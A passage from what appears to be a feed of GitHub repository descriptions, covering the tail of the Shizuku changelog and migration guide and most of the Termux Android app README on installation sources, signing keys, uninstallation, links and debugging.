   &lt;li&gt;A useful API, UserService, is added from v11 and stable on v12. I believe that many Shizuku apps already have a "version &amp;gt; 11" check.&lt;/li&gt; 
   &lt;li&gt;I really want to drop pre-v11 support since &lt;a href="https://github.com/RikkaApps/Shizuku/issues/83"&gt;a possible system issue that may cause system soft reboot (system server crash) on uninstalling Shizuku&lt;/a&gt;.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;12.0.0&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Add &lt;code&gt;Shizuku#peekUserService&lt;/code&gt; that allows you to check if a specific user service is running&lt;/li&gt; 
 &lt;li&gt;Add &lt;code&gt;Shizuku.UserServiceArgs#daemon&lt;/code&gt; that allows you to control if the user service should be run in the "Daemon mode"&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Migration guide for existing applications use Shizuku pre-v11&lt;/h2&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to expand&lt;/summary&gt; 
 &lt;h3&gt;Changes&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Dependency changed (see Guide below)&lt;/li&gt; 
  &lt;li&gt;Self-implemented permission is used from v11, the API is the same to runtime permission (see the demo, and existing runtime permission still works)&lt;/li&gt; 
  &lt;li&gt;Package name was renamed to &lt;code&gt;rikka.shizuku&lt;/code&gt; (replace all &lt;code&gt;moe.shizuku.api.&lt;/code&gt; to &lt;code&gt;rikka.shizuku.&lt;/code&gt;)&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;ShizukuService&lt;/code&gt; class is renamed to &lt;code&gt;Shizuku&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;Methods in &lt;code&gt;Shizuku&lt;/code&gt; class now throw &lt;code&gt;RuntimeException&lt;/code&gt; on failure rather than &lt;code&gt;RemoteException&lt;/code&gt; like other Android APIs&lt;/li&gt; 
  &lt;li&gt;Listeners are moved from &lt;code&gt;ShizukuProvider&lt;/code&gt; class to &lt;code&gt;Shizuku&lt;/code&gt; class&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h3&gt;Add support for Sui&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Call &lt;code&gt;Sui#init()&lt;/code&gt;&lt;/li&gt; 
  &lt;li&gt;It's better to use check Sui with &lt;code&gt;Sui#isSui&lt;/code&gt; before using Shizuku only methods in &lt;code&gt;ShizukuProvider&lt;/code&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt;</description>
    </item>
    
    <item>
      <title>termux/termux-app</title>
      <link>https://github.com/termux/termux-app</link>
      <description>&lt;p&gt;Termux - a terminal emulator application for Android OS extendible by variety of packages.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Termux application&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/termux/termux-app/actions"&gt;&lt;img src="https://github.com/termux/termux-app/workflows/Build/badge.svg?sanitize=true" alt="Build status"&gt;&lt;/a&gt; &lt;a href="https://github.com/termux/termux-app/actions"&gt;&lt;img src="https://github.com/termux/termux-app/workflows/Unit%20tests/badge.svg?sanitize=true" alt="Testing status"&gt;&lt;/a&gt; &lt;a href="https://gitter.im/termux/termux"&gt;&lt;img src="https://badges.gitter.im/termux/termux.svg?sanitize=true" alt="Join the chat at https://gitter.im/termux/termux"&gt;&lt;/a&gt; &lt;a href="https://discord.gg/HXpF69X"&gt;&lt;img src="https://img.shields.io/discord/641256914684084234.svg?label=&amp;amp;logo=discord&amp;amp;logoColor=ffffff&amp;amp;color=5865F2" alt="Join the Termux discord server"&gt;&lt;/a&gt; &lt;a href="https://jitpack.io/#termux/termux-app"&gt;&lt;img src="https://jitpack.io/v/termux/termux-app.svg?sanitize=true" alt="Termux library releases at Jitpack"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://termux.com"&gt;Termux&lt;/a&gt; is an Android terminal application and Linux environment.&lt;/p&gt; 
&lt;p&gt;Note that this repository is for the app itself (the user interface and the terminal emulation). For the packages installable inside the app, see &lt;a href="https://github.com/termux/termux-packages"&gt;termux/termux-packages&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Quick how-to about Termux package management is available at &lt;a href="https://github.com/termux/termux-packages/wiki/Package-Management"&gt;Package Management&lt;/a&gt;. It also has info on how to fix &lt;strong&gt;&lt;code&gt;repository is under maintenance or down&lt;/code&gt;&lt;/strong&gt; errors when running &lt;code&gt;apt&lt;/code&gt; or &lt;code&gt;pkg&lt;/code&gt; commands.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;We are looking for Termux Android application maintainers.&lt;/strong&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;p&gt;&lt;strong&gt;NOTICE: Termux may be unstable on Android 12+.&lt;/strong&gt; Android OS will kill any (phantom) processes greater than 32 (limit is for all apps combined) and also kill any processes using excessive CPU. You may get &lt;code&gt;[Process completed (signal 9) - press Enter]&lt;/code&gt; message in the terminal without actually exiting the shell process yourself. Check the related issue &lt;a href="https://github.com/termux/termux-app/issues/2366"&gt;#2366&lt;/a&gt;, &lt;a href="https://issuetracker.google.com/u/1/issues/205156966"&gt;issue tracker&lt;/a&gt;, &lt;a href="https://github.com/agnostic-apollo/Android-Docs/raw/master/en/docs/apps/processes/phantom-cached-and-empty-processes.md"&gt;phantom cached and empty processes docs&lt;/a&gt; and &lt;a href="https://github.com/termux/termux-app/issues/2366#issuecomment-1237468220"&gt;this TLDR comment&lt;/a&gt; on how to disable trimming of phantom and excessive cpu usage processes. A proper docs page will be added later. An option to disable the killing should be available in Android 12L or 13, so upgrade at your own risk if you are on Android 11, specially if you are not rooted.&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#termux-app-and-plugins"&gt;Termux App and Plugins&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#installation"&gt;Installation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#uninstallation"&gt;Uninstallation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#important-links"&gt;Important Links&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#debugging"&gt;Debugging&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#for-maintainers-and-contributors"&gt;For Maintainers and Contributors&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#forking"&gt;Forking&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Termux App and Plugins&lt;/h2&gt; 
&lt;p&gt;The core &lt;a href="https://github.com/termux/termux-app"&gt;Termux&lt;/a&gt; app comes with the following optional plugin apps.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-api"&gt;Termux:API&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-boot"&gt;Termux:Boot&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-float"&gt;Termux:Float&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-styling"&gt;Termux:Styling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-tasker"&gt;Termux:Tasker&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-widget"&gt;Termux:Widget&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Latest version is &lt;code&gt;v0.118.3&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;NOTICE: It is highly recommended that you update to &lt;code&gt;v0.118.0&lt;/code&gt; or higher ASAP for various bug fixes, including a critical world-readable vulnerability reported &lt;a href="https://termux.github.io/general/2022/02/15/termux-apps-vulnerability-disclosures.html"&gt;here&lt;/a&gt;. See &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#google-play-store-experimental-branch"&gt;below&lt;/a&gt; for information regarding Termux on Google Play.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Termux can be obtained through various sources listed below for &lt;strong&gt;only&lt;/strong&gt; Android &lt;code&gt;&amp;gt;= 7&lt;/code&gt; with full support for apps and packages.&lt;/p&gt; 
&lt;p&gt;Support for both app and packages was dropped for Android &lt;code&gt;5&lt;/code&gt; and &lt;code&gt;6&lt;/code&gt; on &lt;a href="https://www.reddit.com/r/termux/comments/dnzdbs/end_of_android56_support_on_20200101/"&gt;2020-01-01&lt;/a&gt; at &lt;code&gt;v0.83&lt;/code&gt;, however it was re-added just for the app &lt;em&gt;without any support for package updates&lt;/em&gt; on &lt;a href="https://github.com/termux/termux-app/pull/2740"&gt;2022-05-24&lt;/a&gt; via the &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#github"&gt;GitHub&lt;/a&gt; sources. Check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-on-android-5-or-6"&gt;here&lt;/a&gt; for the details.&lt;/p&gt; 
&lt;p&gt;The APK files of different sources are signed with different signature keys. The &lt;code&gt;Termux&lt;/code&gt; app and all its plugins use the same &lt;a href="https://developer.android.com/guide/topics/manifest/manifest-element"&gt;&lt;code&gt;sharedUserId&lt;/code&gt;&lt;/a&gt; &lt;code&gt;com.termux&lt;/code&gt; and so all their APKs installed on a device must have been signed with the same signature key to work together and so they must all be installed from the same source. Do not attempt to mix them together, i.e do not try to install an app or plugin from &lt;code&gt;F-Droid&lt;/code&gt; and another one from a different source like &lt;code&gt;GitHub&lt;/code&gt;. Android Package Manager will also normally not allow installation of APKs with different signatures and you will get errors on installation like &lt;code&gt;App not installed&lt;/code&gt;, &lt;code&gt;Failed to install due to an unknown error&lt;/code&gt;, &lt;code&gt;INSTALL_FAILED_UPDATE_INCOMPATIBLE&lt;/code&gt;, &lt;code&gt;INSTALL_FAILED_SHARED_USER_INCOMPATIBLE&lt;/code&gt;, &lt;code&gt;signatures do not match previously installed version&lt;/code&gt;, etc. This restriction can be bypassed with root or with custom roms.&lt;/p&gt; 
&lt;p&gt;If you wish to install from a different source, then you must &lt;strong&gt;uninstall any and all existing Termux or its plugin app APKs&lt;/strong&gt; from your device first, then install all new APKs from the same new source. Check &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#uninstallation"&gt;Uninstallation&lt;/a&gt; section for details. You may also want to consider &lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt; before the uninstallation so that you can restore it after re-installing from Termux different source.&lt;/p&gt; 
&lt;p&gt;In the following paragraphs, &lt;em&gt;"bootstrap"&lt;/em&gt; refers to the minimal packages that are shipped with the &lt;code&gt;termux-app&lt;/code&gt; itself to start a working shell environment. Its zips are built and released &lt;a href="https://github.com/termux/termux-packages/releases"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;F-Droid&lt;/h3&gt; 
&lt;p&gt;Termux application can be obtained from &lt;code&gt;F-Droid&lt;/code&gt; from &lt;a href="https://f-droid.org/en/packages/com.termux/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;You &lt;strong&gt;do not&lt;/strong&gt; need to download the &lt;code&gt;F-Droid&lt;/code&gt; app (via the &lt;code&gt;Download F-Droid&lt;/code&gt; link) to install Termux. You can download the Termux APK directly from the site by clicking the &lt;code&gt;Download APK&lt;/code&gt; link at the bottom of each version section.&lt;/p&gt; 
&lt;p&gt;It usually takes a few days (or even a week or more) for updates to be available on &lt;code&gt;F-Droid&lt;/code&gt; once an update has been released on &lt;code&gt;GitHub&lt;/code&gt;. The &lt;code&gt;F-Droid&lt;/code&gt; releases are built and published by &lt;code&gt;F-Droid&lt;/code&gt; once they &lt;a href="https://gitlab.com/fdroid/fdroiddata/-/blob/master/metadata/com.termux.yml"&gt;detect&lt;/a&gt; a new &lt;code&gt;GitHub&lt;/code&gt; release. The Termux maintainers &lt;strong&gt;do not&lt;/strong&gt; have any control over the building and publishing of the Termux apps on &lt;code&gt;F-Droid&lt;/code&gt;. Moreover, the Termux maintainers also do not have access to the APK signing keys of &lt;code&gt;F-Droid&lt;/code&gt; releases, so we cannot release an APK ourselves on &lt;code&gt;GitHub&lt;/code&gt; that would be compatible with &lt;code&gt;F-Droid&lt;/code&gt; releases.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;F-Droid&lt;/code&gt; app often may not notify you of updates and you will manually have to do a pull down swipe action in the &lt;code&gt;Updates&lt;/code&gt; tab of the app for it to check updates. Make sure battery optimizations are disabled for the app, check &lt;a href="https://dontkillmyapp.com/"&gt;https://dontkillmyapp.com/&lt;/a&gt; for details on how to do that.&lt;/p&gt; 
&lt;p&gt;Only a universal APK is released, which will work on all supported architectures. The APK and bootstrap installation size will be &lt;code&gt;~180MB&lt;/code&gt;. &lt;code&gt;F-Droid&lt;/code&gt; does &lt;a href="https://github.com/termux/termux-app/pull/1904"&gt;not support&lt;/a&gt; architecture specific APKs.&lt;/p&gt; 
&lt;h3&gt;GitHub&lt;/h3&gt; 
&lt;p&gt;Termux application can be obtained on &lt;code&gt;GitHub&lt;/code&gt; either from &lt;a href="https://github.com/termux/termux-app/releases"&gt;&lt;code&gt;GitHub Releases&lt;/code&gt;&lt;/a&gt; for version &lt;code&gt;&amp;gt;= 0.118.0&lt;/code&gt; or from &lt;a href="https://github.com/termux/termux-app/actions/workflows/debug_build.yml?query=branch%3Amaster+event%3Apush"&gt;&lt;code&gt;GitHub Build Action&lt;/code&gt;&lt;/a&gt; workflows. &lt;strong&gt;For android &lt;code&gt;&amp;gt;= 7&lt;/code&gt;, only install &lt;code&gt;apt-android-7&lt;/code&gt; variants. For android &lt;code&gt;5&lt;/code&gt; and &lt;code&gt;6&lt;/code&gt;, only install &lt;code&gt;apt-android-5&lt;/code&gt; variants.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The APKs for &lt;code&gt;GitHub Releases&lt;/code&gt; will be listed under &lt;code&gt;Assets&lt;/code&gt; drop-down of a release. These are automatically attached when a new version is released.&lt;/p&gt; 
&lt;p&gt;The APKs for &lt;code&gt;GitHub Build&lt;/code&gt; action workflows will be listed under &lt;code&gt;Artifacts&lt;/code&gt; section of a workflow run. These are created for each commit/push done to the repository and can be used by users who don't want to wait for releases and want to try out the latest features immediately or want to test their pull requests. Note that for action workflows, you need to be &lt;a href="https://github.com/login"&gt;&lt;strong&gt;logged into a &lt;code&gt;GitHub&lt;/code&gt; account&lt;/strong&gt;&lt;/a&gt; for the &lt;code&gt;Artifacts&lt;/code&gt; links to be enabled/clickable. If you are using the &lt;a href="https://github.com/mobile"&gt;&lt;code&gt;GitHub&lt;/code&gt; app&lt;/a&gt;, then make sure to open workflow link in a browser like Chrome or Firefox that has your GitHub account logged in since the in-app browser may not be logged in.&lt;/p&gt; 
&lt;p&gt;The APKs for both of these are &lt;a href="https://developer.android.com/studio/debug"&gt;&lt;code&gt;debuggable&lt;/code&gt;&lt;/a&gt; and are compatible with each other but they are not compatible with other sources.&lt;/p&gt; 
&lt;p&gt;Both universal and architecture specific APKs are released. The APK and bootstrap installation size will be &lt;code&gt;~180MB&lt;/code&gt; if using universal and &lt;code&gt;~120MB&lt;/code&gt; if using architecture specific. Check &lt;a href="https://github.com/termux/termux-app/issues/2153"&gt;here&lt;/a&gt; for details.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Security warning&lt;/strong&gt;: APK files on GitHub are signed with a test key that has been &lt;a href="https://github.com/termux/termux-app/raw/master/app/testkey_untrusted.jks"&gt;shared with community&lt;/a&gt;. This IS NOT an official developer key and everyone can use it to generate releases for own testing. Be very careful when using Termux GitHub builds obtained elsewhere except &lt;a href="https://github.com/termux/termux-app"&gt;https://github.com/termux/termux-app&lt;/a&gt;. Everyone is able to use it to forge a malicious Termux update installable over the GitHub build. Think twice about installing Termux builds distributed via Telegram or other social media. If your device get caught by malware, we will not be able to help you.&lt;/p&gt; 
&lt;p&gt;The &lt;a href="https://github.com/termux/termux-app/raw/master/app/testkey_untrusted.jks"&gt;test key&lt;/a&gt; shall not be used to impersonate @termux and can't be used for this anyway. This key is not trusted by us and it is quite easy to detect its use in user generated content.&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;Keystore information&lt;/summary&gt; 
 &lt;pre&gt;&lt;code&gt;Alias name: alias
Creation date: Oct 4, 2019
Entry type: PrivateKeyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=APK Signer, OU=Earth, O=Earth
Issuer: CN=APK Signer, OU=Earth, O=Earth
Serial number: 29be297b
Valid from: Wed Sep 04 02:03:24 EEST 2019 until: Tue Oct 26 02:03:24 EEST 2049
Certificate fingerprints:
         SHA1: 51:79:55:EA:BF:69:FC:05:7C:41:C7:D3:79:DB:BC:EF:20:AD:85:F2
         SHA256: B6:DA:01:48:0E:EF:D5:FB:F2:CD:37:71:B8:D1:02:1E:C7:91:30:4B:DD:6C:4B:F4:1D:3F:AA:BA:D4:8E:E5:E1
Signature algorithm name: SHA1withRSA (disabled)
Subject Public Key Algorithm: 2048-bit RSA key
Version: 3
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;h3&gt;Google Play Store &lt;strong&gt;(Experimental branch)&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;There is currently a build of Termux available on Google Play for Android 11+ devices, with extensive adjustments in order to pass policy requirements there. This is under development and has missing functionality and bugs (see &lt;a href="https://github.com/termux-play-store/"&gt;here&lt;/a&gt; for status updates) compared to the stable F-Droid build, which is why most users who can should still use F-Droid or GitHub build as mentioned above.&lt;/p&gt; 
&lt;p&gt;Currently, Google Play will try to update installations away from F-Droid ones. Updating will still fail as &lt;a href="https://developer.android.com/guide/topics/manifest/manifest-element#uid"&gt;sharedUserId&lt;/a&gt; has been removed. A planned 0.118.1 F-Droid release will fix this by setting a higher version code than used for the PlayStore app. Meanwhile, to prevent Google Play from attempting to download and then fail to install the Google Play releases over existing installations, you can open the Termux apps pages on Google Play and then click on the 3 dots options button in the top right and then disable the Enable auto update toggle. However, the Termux apps updates will still show in the PlayStore app updates list.&lt;/p&gt; 
&lt;p&gt;If you want to help out with testing the Google Play build (or cannot install Termux from other sources), be aware that it's built from a separate repository (&lt;a href="https://github.com/termux-play-store/"&gt;https://github.com/termux-play-store/&lt;/a&gt;) - be sure to report issues &lt;a href="https://github.com/termux-play-store/termux-issues/issues/new/choose"&gt;there&lt;/a&gt;, as any issues encountered might very well be specific to that repository.&lt;/p&gt; 
&lt;h2&gt;Uninstallation&lt;/h2&gt; 
&lt;p&gt;Uninstallation may be required if a user doesn't want Termux installed in their device anymore or is switching to a different &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#installation"&gt;install source&lt;/a&gt;. You may also want to consider &lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt; before the uninstallation.&lt;/p&gt; 
&lt;p&gt;To uninstall Termux completely, you must uninstall &lt;strong&gt;any and all existing Termux or its plugin app APKs&lt;/strong&gt; listed in &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/#termux-app-and-plugins"&gt;Termux App and Plugins&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Go to &lt;code&gt;Android Settings&lt;/code&gt; -&amp;gt; &lt;code&gt;Applications&lt;/code&gt; and then look for those apps. You can also use the search feature if itâ€™s available on your device and search &lt;code&gt;termux&lt;/code&gt; in the applications list.&lt;/p&gt; 
&lt;p&gt;Even if you think you have not installed any of the plugins, it's strongly suggested to go through the application list in Android settings and double-check.&lt;/p&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Important Links&lt;/h2&gt; 
&lt;h3&gt;Community&lt;/h3&gt; 
&lt;p&gt;All community links are available &lt;a href="https://wiki.termux.com/wiki/Community"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The main ones are the following.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://reddit.com/r/termux"&gt;Termux Reddit community&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://matrix.to/#/%23termux_termux:gitter.im"&gt;Termux User Matrix Channel&lt;/a&gt; (&lt;a href="https://gitter.im/termux/termux"&gt;Gitter&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://matrix.to/#/%23termux_dev:gitter.im"&gt;Termux Dev Matrix Channel&lt;/a&gt; (&lt;a href="https://gitter.im/termux/dev"&gt;Gitter&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://twitter.com/termuxdevs"&gt;Termux X (Twitter)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="mailto:support@termux.dev"&gt;Termux Support Email&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Wikis&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/"&gt;Termux Wiki&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-app/wiki"&gt;Termux App Wiki&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki"&gt;Termux Packages Wiki&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Miscellaneous&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/FAQ"&gt;FAQ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki/Termux-file-system-layout"&gt;Termux File System Layout&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Differences_from_Linux"&gt;Differences From Linux&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Package_Management"&gt;Package Management&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Remote_Access"&gt;Remote Access&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Backing_up_Termux"&gt;Backing up Termux&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Terminal_Settings"&gt;Terminal Settings&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Touch_Keyboard"&gt;Touch Keyboard&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Internal_and_external_storage"&gt;Android Storage and Sharing Data with Other Apps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://wiki.termux.com/wiki/Termux:API"&gt;Android APIs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/issues/6348"&gt;Moved Termux Packages Hosting From Bintray to IPFS&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-app/wiki/RUN_COMMAND-Intent"&gt;Running Commands in Termux From Other Apps via &lt;code&gt;RUN_COMMAND&lt;/code&gt; intent&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/termux/termux-packages/wiki/Termux-and-Android-10"&gt;Termux and Android 10&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Terminal&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;/summary&gt; 
 &lt;h3&gt;Terminal resources&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html"&gt;XTerm control sequences&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://vt100.net/"&gt;vt100.net&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://wiki.bash-hackers.org/scripting/terminalcodes"&gt;Terminal codes (ANSI and terminfo equivalents)&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h3&gt;Terminal emulators&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;VTE (libvte): Terminal emulator widget for GTK+, mainly used in gnome-terminal. &lt;a href="https://github.com/GNOME/vte"&gt;Source&lt;/a&gt;, &lt;a href="https://bugzilla.gnome.org/buglist.cgi?quicksearch=product%3A%22vte%22+"&gt;Open Issues&lt;/a&gt;, and &lt;a href="https://bugzilla.gnome.org/buglist.cgi?bug_status=RESOLVED&amp;amp;bug_status=VERIFIED&amp;amp;chfield=resolution&amp;amp;chfieldfrom=-2000d&amp;amp;chfieldvalue=FIXED&amp;amp;product=vte&amp;amp;resolution=FIXED"&gt;All (including closed) issues&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;iTerm 2: OS X terminal application. &lt;a href="https://github.com/gnachman/iTerm2"&gt;Source&lt;/a&gt;, &lt;a href="https://gitlab.com/gnachman/iterm2/issues"&gt;Issues&lt;/a&gt; and &lt;a href="https://iterm2.com/documentation.html"&gt;Documentation&lt;/a&gt; (which includes &lt;a href="https://iterm2.com/documentation-escape-codes.html"&gt;iTerm2 proprietary escape codes&lt;/a&gt;).&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Konsole: KDE terminal application. &lt;a href="https://projects.kde.org/projects/kde/applications/konsole/repository"&gt;Source&lt;/a&gt;, in particular &lt;a href="https://projects.kde.org/projects/kde/applications/konsole/repository/revisions/master/show/tests"&gt;tests&lt;/a&gt;, &lt;a href="https://bugs.kde.org/buglist.cgi?bug_severity=critical&amp;amp;bug_severity=grave&amp;amp;bug_severity=major&amp;amp;bug_severity=crash&amp;amp;bug_severity=normal&amp;amp;bug_severity=minor&amp;amp;bug_status=UNCONFIRMED&amp;amp;bug_status=NEW&amp;amp;bug_status=ASSIGNED&amp;amp;bug_status=REOPENED&amp;amp;product=konsole"&gt;Bugs&lt;/a&gt; and &lt;a href="https://bugs.kde.org/buglist.cgi?bug_severity=wishlist&amp;amp;bug_status=UNCONFIRMED&amp;amp;bug_status=NEW&amp;amp;bug_status=ASSIGNED&amp;amp;bug_status=REOPENED&amp;amp;product=konsole"&gt;Wishes&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;hterm: JavaScript terminal implementation from Chromium. &lt;a href="https://github.com/chromium/hterm"&gt;Source&lt;/a&gt;, including &lt;a href="https://github.com/chromium/hterm/raw/master/js/hterm_vt_tests.js"&gt;tests&lt;/a&gt;, and &lt;a href="https://groups.google.com/a/chromium.org/forum/#!forum/chromium-hterm"&gt;Google group&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;xterm: The grandfather of terminal emulators. &lt;a href="https://invisible-island.net/datafiles/release/xterm.tar.gz"&gt;Source&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Connectbot: Android SSH client. &lt;a href="https://github.com/connectbot/connectbot"&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Android Terminal Emulator: Android terminal app which Termux terminal handling is based on. Inactive. &lt;a href="https://github.com/jackpal/Android-Terminal-Emulator"&gt;Source&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h3&gt;Debugging&lt;/h3&gt; 
&lt;p&gt;You can help debug problems of the &lt;code&gt;Termux&lt;/code&gt; app and its plugins by setting appropriate &lt;code&gt;logcat&lt;/code&gt; &lt;code&gt;Log Level&lt;/code&gt; in &lt;code&gt;Termux&lt;/code&gt; app settings -&amp;gt; &lt;code&gt;&amp;lt;APP_NAME&amp;gt;&lt;/code&gt; -&amp;gt; &lt;code&gt;Debugging&lt;/code&gt; -&amp;gt; &lt;code&gt;Log Level&lt;/code&gt; (Requires &lt;code&gt;Termux&lt;/code&gt; app version &lt;code&gt;&amp;gt;= 0.118.0&lt;/code&gt;). The &lt;code&gt;Log Level&lt;/code&gt; defaults to &lt;code&gt;Normal&lt;/code&gt; and log level &lt;code&gt;Verbose&lt;/code&gt; currently logs additional information. Its best to revert log level to &lt;code&gt;Normal&lt;/code&gt; after you have finished debugging since private data may otherwise be passed to &lt;code&gt;logcat&lt;/code&gt; during normal operation and moreover, additional logging increases execution time.&lt;/p&gt; 
